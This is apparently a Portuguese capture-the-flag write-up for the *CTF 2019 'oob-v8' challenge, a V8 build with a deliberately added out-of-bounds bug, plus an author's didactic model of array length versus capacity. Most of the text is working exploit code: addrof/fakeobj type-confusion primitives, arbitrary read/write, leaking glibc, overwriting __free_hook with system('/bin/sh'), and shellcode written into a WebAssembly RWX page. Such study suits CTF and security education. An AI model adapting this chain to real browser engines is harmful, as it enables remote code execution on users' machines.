## Análise da solução

### Informações gerais

+ Artefato: V8
+ Versão: v7.5.0
+ Data: 5 de abril de 2019
+ Descrição: vulnerabilidade de acesso fora dos limites introduzida manualmente
+ CTF: *CTF 2019
+ Nome do desafio: oob-v8

Referência: https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/

Para reconstruir o binário do desafio, execute `bash build/build.sh` a partir desta pasta. O script usa Docker e grava os arquivos gerados em `challenge/`. Os binários originais e o pacote do desafio também estão incluídos.

### Vulnerabilidade

O desafio introduziu manualmente uma vulnerabilidade que permite escrever uma posição além do fim de um array.

```
+BUILTIN(ArrayOob){
+    uint32_t len = args.length();
+    if(len > 2) return ReadOnlyRoots(isolate).undefined_value();
+    Handle<JSReceiver> receiver;
+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+            isolate, receiver, Object::ToObject(isolate, args.receiver()));
+    Handle<JSArray> array = Handle<JSArray>::cast(receiver);
+    FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
+    uint32_t length = static_cast<uint32_t>(array->length()->Number());
+    if(len == 1){
+        // leitura
+        return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
+    }else{
+        // escrita
+        Handle<Object> value;
+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+                isolate, value, Object::ToNumber(isolate, args.at<Object>(1)));
+        elements.set(length,value->Number());
+        return ReadOnlyRoots(isolate).undefined_value();
+    }
+}
```

### Contribuição própria: modelo de comprimento e capacidade

O código do desafio usa `length` como índice em `elements.get_scalar(length)` e `elements.set(length, ...)`. Minha contribuição é o [modelo de capacidade](./contribuicao/modelo_capacidade.js), que separa duas condições frequentemente tratadas como se fossem a mesma: o acesso fora do comprimento lógico do array e o acesso fora da capacidade do armazenamento `FixedDoubleArray`.

Para um comprimento `L` e uma capacidade `C`, com `C >= L`, o índice usado é `i = L`. Portanto, `i >= L` é sempre verdadeiro. Se `C = L`, então `i >= C` e o acesso cruza o limite físico do armazenamento. Se `C > L`, o mesmo índice ainda cabe na capacidade excedente, embora esteja fora do comprimento lógico. A tabela produzida pelo programa torna essa diferença visível:

```text
Comprimento | Capacidade | Índice acessado | Resultado
3           | 3          | 3              | fora do armazenamento
3           | 8          | 3              | dentro da capacidade excedente
```

Execute `node contribuicao/modelo_capacidade.js` para reproduzir a tabela e `node --test contribuicao/modelo_capacidade.test.js` para verificar os casos de fronteira. O modelo é didático: ele classifica índices e não executa o V8 nem afirma qual capacidade ou posição de objetos uma execução real terá. Para confirmar a adjacência ao campo `Map`, é preciso inspecionar a memória do binário do desafio, como na seção seguinte.

### Disposição da memória

Ao executar um programa JavaScript simples e inspecionar a memória, observamos que o objeto `JSArray` fica logo após os elementos do array. A escrita fora dos limites permite sobrescrever o campo `Map` desse objeto.

```
let a = [1.1, 2.2, 3.3];
%DebugPrint(a);
Math.cosh(1);
```

![Disposição do array de números na memória](./solution/assets/double-array-1.jpg)
![Disposição do array e da página WebAssembly](./solution/assets/double-array-2.jpg)


### Confusão de tipos

Sobrescrever o campo `Map` de um `JSArray` pode causar confusão de tipos no V8. Esse campo determina o tipo dos elementos e a forma de acessá-los:

1. Array de objetos: ao acessar um elemento, por exemplo no índice 0, o V8 interpreta seu valor como um ponteiro para um objeto e busca o objeto referenciado.

2. Array de números de ponto flutuante: o acesso retorna diretamente o número armazenado naquele índice.

A confusão de tipos permite obter o endereço de um `JSObject` ao fazer o V8 interpretar seu ponteiro como um valor numérico. No sentido inverso, um valor numérico que representa um endereço pode ser interpretado como ponteiro, permitindo escrever nos dados apontados.

Para revelar o endereço de um objeto, substituímos o `Map` de um array de objetos pelo `Map` de um array de números de ponto flutuante. O ponteiro do elemento passa a ser lido como número.

```
var temp_obj = {"A":1};
var obj_arr = [temp_obj];
var fl_arr = [1.1, 1.2, 1.3, 1.4];
var map1 = obj_arr.oob();
var map2 = fl_arr.oob();

obj_arr.oob(map2);
let addr = obj_arr[0];
console.log("[+] endereço de temp_obj: 0x" + ftoi(addr).toString(16));
// [+] endereço de temp_obj: 0x2c4b4c4eab1
```

No sentido contrário, podemos fazer o V8 tratar um número de ponto flutuante como referência a um objeto.

```
fl_arr.oob(map1);
let fakeobj = fl_arr[0]; // treat 1.1 in hex format as an address of object
console.log("[+] fakeobj: 0x" + ftoi(fakeobj).toString(16));
```

Assim, obtemos duas primitivas básicas: `addrof` e `fakeobj`.

```
var temp_obj = {"A":1};
var obj_arr = [temp_obj];
var fl_arr = [1.1, 1.2, 1.3, 1.4];
var map1 = obj_arr.oob();
var map2 = fl_arr.oob();

function addrof(in_obj) {
    obj_arr[0] = in_obj;    // Primeiro, colocamos no índice 0 o objeto cujo endereço queremos descobrir
    obj_arr.oob(map2);      // Substituímos o map do array de objetos pelo map do array de números
    let addr = obj_arr[0];  // Obtemos o endereço ao acessar o índice 0
    obj_arr.oob(map1);      // Restauramos o map original
    return ftoi(addr);      // Retornamos o endereço como BigInt
}

function fakeobj(addr) {
    fl_arr[0] = itof(addr);     // Primeiro, colocamos o endereço como número de ponto flutuante no índice 0
    fl_arr.oob(map1);           // Substituímos o map do array de números pelo map do array de objetos
    let fake = fl_arr[0];       // Obtemos e guardamos o objeto falso naquele endereço
    fl_arr.oob(map2);           // Restauramos o map original
    return fake;                // Retornamos o objeto
}
```

Estas são as funções auxiliares:

```
/// Funções auxiliares para converter entre números de ponto flutuante e inteiros
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Consideramos a ordem de bytes little-endian
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}
```

### Primitivas de leitura e escrita arbitrárias

#### Primitiva de leitura arbitrária
Para ler um endereço arbitrário com `addrof` e `fakeobj`, manipulamos um array de números de ponto flutuante e criamos um objeto falso:

1. Criar um array de quatro números de ponto flutuante. Nesta disposição de memória, o armazenamento dos elementos fica 0x30 bytes antes do objeto do array.
2. Criar um objeto falso nos elementos, com o tipo de um array de números de ponto flutuante.
3. Colocar o endereço de destino em `element[2]`. Essa posição será interpretada como o campo `elements` do objeto falso.
4. Acessar o índice 0 do objeto falso. O V8 tentará ler o valor em `endereço de destino + 0x10`.

![Esquema da primitiva de leitura arbitrária](./solution/assets/arbitrary-read-primitive.jpg)

```
// Para revelar o conteúdo da string a seguir:
let target_string = "AAAAAAAA";
let target_string_addr = addrof(target_string);
console.log("[+] endereço da string de destino: 0x" + target_string_addr.toString(16));
// %SystemBreak();
// [+] endereço da string de destino: 0xc6a37f9f3c9
// (gdb) x/32xw 0xc6a37f9f3c9-1
// 0xc6a37f9f3c8:	0xd9840461	0x00003369	0xe62bbeea	0x00000008
// 0xc6a37f9f3d8:	0x41414141	0x41414141	0xd9840461	0x00003369  <-- target_string
// 0xc6a37f9f3e8:	0xfe1f98a6	0x00000012	0x67726174	0x735f7465

let floatArray = [1.1, 1.2, 1.3, 1.4];
let floatArrayMap = floatArray.oob();
floatArray[0] = floatArrayMap;
floatArray[2] = itof(BigInt(target_string_addr));
console.log("[+] endereço revelado de floatArray: 0x" + addrof(floatArray).toString(16));
// %SystemBreak();

// [+] endereço revelado de floatArray: 0x3dbbd148f619
// (gdb) x/32xw 0x3dbbd148f619-1-0x30
// 0x3dbbd148f5e8:	0xd98414f9	0x00003369	0x00000000	0x00000004  <-- FixedDoubleArray
// 0x3dbbd148f5f8:	0x43142ed9	0x00003fb1	0x33333333	0x3ff33333
// 0x3dbbd148f608:	0x37f9f3c9	0x00000c6a	0x66666666	0x3ff66666  <-- elements[2]
// 0x3dbbd148f618:	0x43142ed9	0x00003fb1	0xd9840c71	0x00003369  <-- JSArray
// 0x3dbbd148f628:	0xd148f5e9	0x00003dbb	0x00000000	0x00000004  <-- ponteiro elements
// 0x3dbbd148f638:	0xd9840561	0x00003369	0x43142ed9	0x00003fb1
// 0x3dbbd148f648:	0xd98412c9	0x00003369	0x00000000	0x00000001
// 0x3dbbd148f658:	0x00000000	0x00000400	0xd98413b9	0x00003369

let fakeArray = fakeobj(addrof(floatArray)-0x20n);
console.log("[+] valor revelado: 0x" + ftoi(fakeArray[0]).toString(16)); // Lemos o valor em target_string_addr + 0x10
```

Código da primitiva:

```
// Usamos este array para ler e escrever em endereços arbitrários
var arb_rw_arr = [float_arr_map, 1.2, 1.3, 1.4];

console.log("[+] array de números controlado: 0x" + addrof(arb_rw_arr).toString(16));

function arb_read(addr) {
    // A leitura exige ponteiros com tag; por isso, ajustamos o endereço
    if (addr % 2n == 0)
	addr += 1n;

    // Criamos um objeto falso sobre o array preparado, com o map de um array de números
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);

    // Alteramos o ponteiro elements para apontar a read_addr - 0x10
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);

    // O índice 0 retorna o valor em read_addr
    return ftoi(fake[0]);
}
```


#### Primitiva de escrita arbitrária

Segundo o [artigo de referência](https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/), reutilizar a primitiva de leitura para escrever em `fakeobj[0]` falha em alguns endereços, como o de `__free_hook`. No exemplo acima, porém, a escrita no conteúdo de uma string do ambiente JavaScript funciona.

```
let target_string = "AAAAAAAA";
let target_string_addr = addrof(target_string);
console.log("[+] endereço da string de destino: 0x" + target_string_addr.toString(16));

let floatArray = [1.1, 1.2, 1.3, 1.4];
let floatArrayMap = floatArray.oob();
floatArray[0] = floatArrayMap;
floatArray[2] = itof(BigInt(target_string_addr));
console.log("[+] endereço revelado de floatArray: 0x" + addrof(floatArray).toString(16));

let fakeArray = fakeobj(addrof(floatArray)-0x20n);
console.log("[+] valor revelado: 0x" + ftoi(fakeArray[0]).toString(16)); // Lemos o valor em target_string_addr + 0x10

console.log("[+] tentativa de escrita deste valor: " + itof(BigInt(0x4242424242424242)));
fakeArray[0] = itof(BigInt(0x4242424242424242));
console.log("[+] valor revelado de fakeArray[0]: " + fakeArray[0]);
console.log("[+] conteúdo revelado de target_string: " + target_string)

// SAÍDA
root@48d3ec3e0728:/build/v8/v8# ./out.gn/x64.release/d8 --allow-natives-syntax /solve/solve.js
[+] endereço da string de destino: 0x24bf42cdf3c9
[+] endereço revelado de floatArray: 0x292080f9f9
[+] valor revelado: 0x4141414141414141
[+] tentativa de escrita deste valor: 156842099844.53125
[+] valor revelado de fakeArray[0]: 156842099844.53125
[+] conteúdo revelado de target_string: DBBBBBB // a conversão BigInt -> Float -> byte perde precisão
```

Isso fornece uma primeira versão da escrita arbitrária, que podemos aprimorar.

```
function initial_arb_write(addr, val) {
    // Criamos um objeto falso sobre o array preparado, com o map de um array de números
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);

    // Alteramos o ponteiro elements para apontar a write_addr - 0x10
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);

    // Escrevemos no índice 0 como número de ponto flutuante
    fake[0] = itof(BigInt(val));
}
```

**Uma versão mais robusta**

Para escrever com mais precisão, usamos `ArrayBuffer` e `DataView`. O primeiro armazena bytes; o segundo permite interpretá-los e gravá-los em formatos específicos.

Em vez de escrever por meio de um array de números de ponto flutuante, alteramos o ponteiro `backing_store` de um `ArrayBuffer`, análogo ao campo `elements` do array.

![Esquema da primitiva de escrita arbitrária](./solution/assets/arbitrary-write-primitive.jpg)

```
function arb_write(addr, val) {
    let buf = new ArrayBuffer(8);
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);
    let backing_store_addr = buf_addr + 0x20n;
    initial_arb_write(backing_store_addr, addr);
    dataview.setBigUint64(0, BigInt(val), true);
}
```

### Desvio do fluxo de execução: substituir `__free_hook` por `system`

Com as primitivas prontas, precisamos descobrir o endereço base da glibc, pois os símbolos `__free_hook` e `system` têm deslocamentos conhecidos em relação a ele. Os objetos JavaScript ficam na memória gerenciada pelo V8, separada da memória gerenciada por `ptmalloc`. Por isso, procuramos, na memória do V8, ponteiros para outras regiões, como a heap do processo, o segmento de código e a glibc.

#### Descobrir o endereço da heap
```
(gdb) search-pattern 0x000055d8 little 0x0000101634300000-0x0000101634340000
[+] Buscando '\xd8\x55\x00\x00' in 0x0000101634300000-0x0000101634340000
[+] In (0x101634300000-0x101634340000), permissão=rw-
  0x101634300014 - 0x101634300024  →   "\xd8\x55\x00\x00[...]"
  0x10163430001c - 0x10163430002c  →   "\xd8\x55\x00\x00[...]"
```

```
// buf_addr = 0x10163430ddd0
// v8_heap_base_addr = buf_addr & 0xffffffff0000n
let buf_addr = addrof(buf);
let v8_heap_base_addr = buf_addr & 0xffffffff0000n
let heap_ptr_addr = v8_heap_base_addr + 0x10n;

let heap_ptr = arb_read(heap_ptr_addr);
let heap_base = heap_ptr
console.log("[+] ponteiro revelado para a heap: 0x" + heap_ptr.toString(16));

// SAÍDA
root@48d3ec3e0728:/build/v8/v8# ./out.gn/x64.release/d8 --allow-natives-syntax /solve/solve.js
[+] ponteiro revelado para a heap: 0x555809da46d0
[+] endereço base da heap: 0x555809d2c000
```

#### Descobrir o endereço do segmento de código

Da mesma forma, procuramos na heap um ponteiro para a glibc ou para o segmento de código.

```
(gdb) search-pattern 0x0000558485 little 0x0000558487367000-0x0000558487415000
[+] Buscando '\x85\x84\x55\x00\x00' in 0x0000558487367000-0x0000558487415000
[+] In '[heap]'(0x558487367000-0x558487415000), permissão=rw-
  0x55848736966b - 0x55848736967f  →   "\x85\x84\x55\x00\x00[...]"
(gdb) x/32xw 0x558487369668
0x558487369668:	0x85c259b5	0x00005584	0x0000001d	0x00000000
0x558487369678:	0x87369a80	0x00005584	0x00000000	0x65757274
```

```
let text_seg_ptr= arb_read(heap_base_addr + 0x2668n);
let pie_base_addr = text_seg_ptr - 0xBE9B5n;
console.log("[+] ponteiro revelado para PIE: 0x" + pie_base_addr.toString(16));
```

#### Descobrir o endereço da glibc

Depois de descobrir a base do executável PIE, lemos a entrada de `puts` na tabela `.got`, que aponta para a função na glibc.

```
(gdb) got puts
Proteção da GOT: Full RelRO | Funções na GOT: 228
[0x5644e9dfe3b8] puts@GLIBC_2.2.5  →  0x7fd36c527970
```

```
let puts_got_addr = pie_base_addr + 0xD9A3B8n;
let puts_addr = arb_read(puts_got_addr);
let libc_base_addr = puts_addr - 0x80970n;
console.log("[+] ponteiro revelado para a libc: 0x" + libc_base_addr.toString(16));
```

#### Substituir `__free_hook` por `system`

Em seguida, calculamos os deslocamentos de `__free_hook` e `system` dentro da glibc.
```
(gdb) p &__free_hook
$1 = (void (**)(void *, const void *)) 0x7f55961f08e8 <__free_hook>

(gdb) p system
$2 = {int (const char *)} 0x7f5595e52420 <__libc_system>
```

```
let free_hook_addr = libc_base_addr + 0x3ed8e8n;
let system_addr = libc_base_addr + 0x4f420n;
arb_write(free_hook_addr, system_addr);
%SystemBreak();

// VERIFICAÇÃO DA SAÍDA
(gdb) p __free_hook
$1 = (void (*)(void *, const void *)) 0x7fc5e6103420 <__libc_system>
```

Por fim, a linha abaixo aciona `system('/bin/sh')` quando a string `/bin/sh` é liberada.
```
console.log("/bin/sh");
```

### Desvio do fluxo de execução: criar uma página RWX com WebAssembly

Nas versões antigas do V8, o código WebAssembly podia ocupar uma página com permissões de leitura, escrita e execução (RWX). O `wasm_code` abaixo contém uma função `main` que retorna 42. Ao instanciá-la, o V8 cria a página RWX; ao chamá-la, passa por uma tabela de saltos nessa página para alcançar `main`.

![Disposição do array e da página WebAssembly](./solution/assets/double-array-2.jpg)

```
// https://wasdk.github.io/WasmFiddle/
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

var rwx_page_addr = arb_read(addrof(wasm_instance)-1n+0x88n);

console.log("[+] endereço da página RWX do Wasm: 0x" + rwx_page_addr.toString(16));

// SAÍDA
[+] endereço da página RWX do Wasm: 0x7b54b655000
```

Basta então gravar o shellcode no início da página RWX e chamar `main`.

```
function copy_shellcode(addr, shellcode) {
    let buf = new ArrayBuffer(0x100);
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);
    let backing_store_addr = buf_addr + 0x20n;
    initial_arb_write(backing_store_addr, addr);

    for (let i = 0; i < shellcode.length; i++) {
	dataview.setUint32(4*i, shellcode[i], true);
    }
}

// referência: https://www.anquanke.com/post/id/267518?hmsr=joyk.com&utm_source=joyk.com&utm_medium=referral#h3-14
var shellcode = [
  0x99583b6a, 0x2fbb4852,
  0x6e69622f, 0x5368732f,
  0x57525f54, 0x050f5e54
];

copy_shellcode(rwx_page_addr, shellcode);
f();
```
